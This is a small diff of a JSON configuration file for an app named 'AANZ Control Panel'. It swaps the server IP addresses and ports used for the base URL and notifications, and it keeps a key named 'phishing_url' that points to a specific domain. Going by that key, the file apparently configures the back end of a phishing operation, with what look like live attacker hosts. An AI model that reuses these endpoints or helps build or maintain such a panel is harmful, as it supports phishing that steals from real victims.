@@ -1,7 +1,7 @@
 {
-  "base_url": "http://165.22.240.247:2001",
+  "base_url": "http://178.128.16.183:2001",
   "phishing_url": "http://xii.aanzload.my.id:2002",
-  "base_notif": "http://165.22.240.247:2000",
+  "base_notif": "http://178.128.16.183:2005",
   "version": "1.0.0",
   "app_name": "AANZ Control Panel",
   "endpoints": {
